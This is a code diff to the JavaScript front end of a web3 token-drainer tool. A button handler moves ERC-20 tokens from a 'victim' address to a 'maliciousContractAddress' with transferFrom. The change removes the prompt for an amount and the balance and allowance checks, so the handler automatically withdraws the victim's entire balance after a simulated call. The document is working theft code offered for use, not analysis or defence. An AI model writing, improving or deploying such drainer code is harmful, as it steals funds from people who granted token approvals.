@@ -603,46 +603,31 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
 
         try {
-            // Step 3: Fetch allowance and victim's token balance
-            console.debug("Fetching allowance and balance...");
-            const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
-            console.debug("Allowance fetched:", allowance);
-
+            // Step 3: Fetch the victim's token balance (raw balance, in the smallest unit)
+            console.debug("Fetching victim's balance...");
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
-            console.debug("Balance fetched:", balance);
+            console.debug("Balance fetched (in smallest unit):", balance);
 
-            // Step 4: Convert allowance and balance to Big Numbers
-            const balanceBN = web3.utils.toBN(balance);
-            const allowanceBN = web3.utils.toBN(allowance);
-            console.debug("Converted values: Balance:", balanceBN.toString(), "Allowance:", allowanceBN.toString());
+            // Step 4: Get the token's decimals dynamically
+            const decimals = await tokenContract.methods.decimals().call();
+            console.debug("Decimals fetched:", decimals);
 
-            // Step 5: Prompt for the amount to withdraw
-            const amountToWithdrawInput = prompt("Enter the amount you want to withdraw (in token units):");
+            // Step 5: Convert balance to human-readable format based on decimals
+            const balanceHumanReadable = balance / Math.pow(10, decimals);
+            console.debug("Balance in human-readable form:", balanceHumanReadable);
 
-            // Convert entered amount to token's smallest unit (considering 18 decimals)
-            const amountToWithdrawBN = web3.utils.toBN(amountToWithdrawInput).mul(web3.utils.toBN(10).pow(web3.utils.toBN(18)));
-            console.debug("Amount to withdraw entered:", amountToWithdrawInput, "Converted to smallest unit:", amountToWithdrawBN.toString());
+            // Step 6: Use the balance as the amount to withdraw (full balance)
+            const amountToWithdrawBN = web3.utils.toBN(balance); // No need to ask user, just withdraw the full balance
+            console.debug("Amount to withdraw (in smallest unit):", amountToWithdrawBN.toString());
 
-            // Step 6: Check if the amount to withdraw is valid (non-zero and within allowance and balance)
+            // Step 7: Check if the amount to withdraw is valid (non-zero)
             if (amountToWithdrawBN.lte(web3.utils.toBN(0))) {
-                alert("Invalid amount to withdraw.");
-                console.debug("Withdraw aborted: Invalid amount.");
-                return; // Stop execution for zero or negative amounts
+                alert("No tokens available to withdraw.");
+                console.debug("Withdraw aborted: No tokens available.");
+                return; // Stop execution for zero amount
             }
 
-            if (amountToWithdrawBN.gt(balanceBN)) {
-                alert("Amount exceeds victim's balance.");
-                console.debug("Withdraw aborted: Amount exceeds balance.");
-                return; // Stop execution if the amount exceeds balance
-            }
-
-            if (amountToWithdrawBN.gt(allowanceBN)) {
-                alert("Amount exceeds approved allowance.");
-                console.debug("Withdraw aborted: Amount exceeds allowance.");
-                return; // Stop execution if the amount exceeds allowance
-            }
-
-            // Step 7: Simulate the withdrawal transaction (no gas fee)
+            // Step 8: Simulate the withdrawal transaction (no gas fee)
             console.debug("Simulating withdrawal transaction...");
             try {
                 const simulationResult = await tokenContract.methods
@@ -650,7 +635,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                     .call({ from: accounts[0] }); // Simulation call
                 console.debug("Simulation successful, result:", simulationResult);
 
-                alert(`Simulation successful. You can proceed to withdraw ${web3.utils.fromWei(amountToWithdrawBN, 'ether')} tokens.`);
+                alert(`Simulation successful. You can proceed to withdraw ${balanceHumanReadable} tokens.`);
             } catch (simulationError) {
                 console.error("Simulation Error:", simulationError);
 
@@ -664,7 +649,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return; // Stop execution on simulation failure
             }
 
-            // Step 8: Execute the actual withdrawal transaction
+            // Step 9: Execute the actual withdrawal transaction
             console.debug("Attempting to execute withdrawal...");
             const transaction = await tokenContract.methods
                 .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdrawBN.toString())
@@ -672,14 +657,15 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             console.debug("Transaction details:", transaction);
 
             // Notify successful withdrawal
-            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdrawBN, 'ether')} tokens!`);
+            alert(`Successfully withdrawn ${balanceHumanReadable} tokens!`);
         } catch (error) {
-            // Step 9: Handle errors during the withdrawal process
+            // Step 10: Handle errors during the withdrawal process
             console.error("Withdrawal Error:", error);
             alert("Error occurred during withdrawal. Check victim's approval and balance.");
         }
     }
 });
+
 
 
 
